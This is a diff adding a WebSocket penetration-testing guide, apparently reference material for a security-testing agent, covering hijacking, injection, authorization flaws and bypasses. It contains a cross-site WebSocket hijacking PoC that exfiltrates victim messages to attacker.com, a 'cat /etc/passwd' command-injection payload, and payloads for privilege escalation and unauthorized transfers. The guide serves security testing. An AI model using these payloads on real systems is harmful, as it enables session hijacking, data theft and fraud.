@@ -1,0 +1,323 @@
+<websocket_security_vulnerability_guide>
+<title>WEBSOCKET SECURITY VULNERABILITIES</title>
+
+<critical>WebSocket connections bypass many traditional web security controls. Browsers send cookies on handshake but don't enforce same-origin policy on established connections. Missing Origin validation, insufficient authentication, and message injection are common vulnerabilities that can lead to session hijacking, data theft, and unauthorized actions.</critical>
+
+<scope>
+- Real-time web applications (chat, notifications, live updates)
+- Trading platforms and financial dashboards
+- Collaborative editing tools
+- Gaming and streaming platforms
+- IoT device communication
+- Internal admin dashboards with live data
+- GraphQL subscriptions over WebSocket
+</scope>
+
+<methodology>
+1. Identify WebSocket endpoints (ws://, wss://) and their purpose
+2. Analyze handshake authentication and Origin header handling
+3. Test for cross-site WebSocket hijacking (CSWSH)
+4. Examine message format and injection points
+5. Test authorization on individual message types/channels
+6. Check for race conditions and message sequencing issues
+</methodology>
+
+<high_value_targets>
+- Authentication state synchronization
+- Real-time trading/bidding systems
+- Administrative control channels
+- Private messaging systems
+- Live data feeds with sensitive information
+- Remote command execution interfaces
+- Multi-player game state synchronization
+</high_value_targets>
+
+<discovery_techniques>
+<endpoint_identification>
+- Inspect Network tab for ws:// or wss:// connections
+- Search JavaScript for WebSocket, Socket.io, ws, SockJS
+- Look for Upgrade: websocket headers in HTTP traffic
+- Check for Socket.io polling fallback endpoints (/socket.io/)
+- GraphQL subscriptions often use wss://
+</endpoint_identification>
+
+<handshake_analysis>
+HTTP handshake request:
+GET /ws HTTP/1.1
+Host: target.com
+Upgrade: websocket
+Connection: Upgrade
+Origin: https://target.com
+Sec-WebSocket-Key: [base64]
+Sec-WebSocket-Version: 13
+Cookie: session=xxx
+
+Check response:
+- Does it validate Origin header?
+- Are cookies required?
+- Is Sec-WebSocket-Protocol validated?
+- Are custom auth headers required?
+</handshake_analysis>
+
+<protocol_identification>
+Raw WebSocket:
+- Binary or text frames
+- Custom JSON/Protocol Buffers
+
+Socket.io:
+- Messages prefixed with type (0=open, 2=ping, 4=message)
+- Namespace prefixing: /namespace,["event",data]
+
+SockJS:
+- o = open, h = heartbeat, a = array message
+- Fallback transports: xhr-streaming, xhr-polling
+
+STOMP:
+- CONNECT, SUBSCRIBE, SEND, MESSAGE frames
+- Headers in frame format
+</protocol_identification>
+</discovery_techniques>
+
+<vulnerability_types>
+<cswsh>
+Cross-Site WebSocket Hijacking:
+
+If Origin not validated, attacker page can:
+1. Open WebSocket to vulnerable server
+2. Server accepts (cookies sent automatically)
+3. Attacker reads messages meant for victim
+4. Attacker sends messages as victim
+
+PoC:
+```html
+&lt;script&gt;
+var ws = new WebSocket('wss://vulnerable.com/ws');
+ws.onmessage = function(e) {
+  // Exfiltrate data
+  fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
+};
+ws.onopen = function() {
+  // Send commands as victim
+  ws.send(JSON.stringify({action: 'getPrivateData'}));
+};
+&lt;/script&gt;
+```
+</cswsh>
+
+<missing_authentication>
+Per-message authentication issues:
+- Session validated on handshake only, not per message
+- Token expiration not checked during connection
+- Channel subscriptions not authorized
+- Admin actions available after auth downgrade
+
+Test:
+1. Connect with valid session
+2. Invalidate session (logout in another tab)
+3. Continue sending messages - still accepted?
+4. Subscribe to privileged channels - allowed?
+</missing_authentication>
+
+<message_injection>
+Input injection in messages:
+- NoSQL/SQL injection via message parameters
+- Command injection in message handlers
+- XSS if messages rendered in DOM
+- SSTI if messages processed by templates
+
+JSON message manipulation:
+{"action": "message", "text": "hello", "__proto__": {"admin": true}}
+{"type": "command", "cmd": "ls; cat /etc/passwd"}
+{"query": {"$ne": null}}
+</message_injection>
+
+<idor_in_messages>
+Resource access via message parameters:
+- Channel/room IDs without authorization
+- User IDs in DM functionality
+- Document/file IDs in collaborative tools
+
+Test:
+{"action": "subscribe", "room": "admin-room"}
+{"action": "getMessages", "conversationId": "other-user-conversation"}
+{"action": "updateDocument", "docId": "not-my-document", "content": "..."}
+</idor_in_messages>
+
+<denial_of_service>
+- Connection exhaustion (open many connections)
+- Large message flooding
+- Malformed frame handling
+- Ping/pong abuse
+- Rapid connect/disconnect cycles
+- Memory exhaustion via large payloads
+</denial_of_service>
+
+<race_conditions>
+Real-time race conditions:
+- Bidding systems: place bid during price update
+- Inventory: purchase during stock sync
+- Games: action during state transition
+- Collaborative editing: conflicting edits
+
+Exploit:
+1. Monitor for state-change messages
+2. Send action immediately before/after
+3. Exploit timing window in server logic
+</race_conditions>
+</vulnerability_types>
+
+<exploitation_techniques>
+<session_hijacking>
+1. Victim visits attacker-controlled page
+2. Page opens WebSocket to vulnerable server
+3. Browser sends victim's cookies automatically
+4. Attacker receives all WebSocket messages
+5. Can send messages as victim (chat, commands, trades)
+</session_hijacking>
+
+<privilege_escalation>
+Modify message to gain access:
+Original: {"role": "user", "action": "view"}
+Modified: {"role": "admin", "action": "delete"}
+
+Subscribe to admin channels:
+{"subscribe": "/admin/audit-log"}
+{"join": "moderator-room"}
+</privilege_escalation>
+
+<data_exfiltration>
+Passive listening:
+- Private messages between other users
+- Admin activity logs
+- System health/debug information
+- Trading data and positions
+
+Active extraction:
+{"action": "export", "type": "all_users"}
+{"action": "search", "query": "*", "includeDeleted": true}
+</data_exfiltration>
+
+<action_execution>
+Execute unauthorized actions:
+{"action": "transfer", "amount": 1000, "to": "attacker"}
+{"action": "deleteUser", "userId": "admin"}
+{"action": "updateConfig", "setting": "debugMode", "value": true}
+</action_execution>
+</exploitation_techniques>
+
+<library_specific>
+<socket_io>
+Event injection:
+socket.emit('admin:deleteUser', {userId: 1});
+socket.emit('__proto__', {polluted: true});
+
+Namespace access:
+var adminSocket = io('/admin');
+
+Room enumeration:
+socket.emit('join', 'room-' + i);
+</socket_io>
+
+<signalr>
+Hub method invocation:
+connection.invoke("AdminMethod", args);
+
+Group membership:
+Groups.AddToGroupAsync(Context.ConnectionId, "Admins");
+</signalr>
+
+<action_cable>
+Channel subscription:
+{"command": "subscribe", "identifier": "{\"channel\":\"AdminChannel\"}"}
+
+Action execution:
+{"command": "message", "identifier": "...", "data": "{\"action\":\"admin_action\"}"}
+</action_cable>
+
+<graphql_subscriptions>
+Subscription injection:
+{"type": "start", "payload": {"query": "subscription { adminEvents { ... } }"}}
+
+Introspection via subscription:
+{"type": "start", "payload": {"query": "subscription { __schema { types { name } } }"}}
+</graphql_subscriptions>
+</library_specific>
+
+<bypass_techniques>
+<origin_validation_bypass>
+- Null Origin (sandboxed iframes, file:// protocol)
+- Subdomain variations: ws.evil.target.com
+- Protocol switch: http://target.com vs https://target.com
+- Case sensitivity: Target.com vs target.com
+- Port inclusion: target.com:443 vs target.com
+</origin_validation_bypass>
+
+<authentication_bypass>
+- Token in URL parameter (often not validated post-handshake)
+- Expired tokens still accepted for existing connections
+- Anonymous connection upgraded to authenticated
+- Guest access to privileged channels
+</authentication_bypass>
+
+<rate_limit_bypass>
+- Multiple WebSocket connections
+- Message batching
+- Connection pooling across subdomains
+- Slow message rate under detection threshold
+</rate_limit_bypass>
+</bypass_techniques>
+
+<testing_tools>
+Command line:
+- websocat: CLI WebSocket client
+- wscat: Node.js WebSocket client
+- wsdump.py: Dump WebSocket traffic
+
+Browser DevTools:
+- Network tab WebSocket frames inspection
+- Console: new WebSocket('wss://...')
+
+Burp Suite:
+- WebSocket history and manipulation
+- Match and replace for message modification
+- Intruder for message fuzzing
+</testing_tools>
+
+<validation>
+1. Demonstrate cross-origin WebSocket connection with cookie authentication
+2. Show unauthorized message received or action executed
+3. Provide PoC HTML page that exploits CSWSH
+4. For message injection, show command output or data exfiltration
+5. Document the specific missing security control
+</validation>
+
+<false_positives>
+- Public WebSocket feeds (stock tickers, public chat)
+- Origin validation correctly implemented
+- Token-based authentication with per-message validation
+- Read-only connections with no sensitive data
+- Proper channel-level authorization
+</false_positives>
+
+<impact>
+- Session hijacking and impersonation
+- Real-time data theft (messages, trading info)
+- Unauthorized action execution
+- Financial fraud in trading applications
+- Privacy violations in messaging apps
+- Administrative access in control systems
+</impact>
+
+<pro_tips>
+1. CSWSH is WebSocket's CSRF - always test Origin validation first.
+2. Socket.io has its own protocol layer - understand the framing before injecting.
+3. Per-message authorization is often missing even when handshake is authenticated.
+4. Long-lived connections mean session revocation rarely works.
+5. GraphQL subscriptions often inherit GraphQL's authorization weaknesses.
+6. Race conditions are common in real-time systems - test concurrent operations.
+7. Browsers send cookies automatically on WebSocket upgrade - no CSRF tokens needed.
+</pro_tips>
+
+<remember>WebSocket security often relies solely on the assumption that only legitimate clients will connect. Test cross-origin connection, per-message authorization, and channel access controls. The handshake is HTTP, but everything after is largely unprotected by browser security policies.</remember>
+</websocket_security_vulnerability_guide>
+
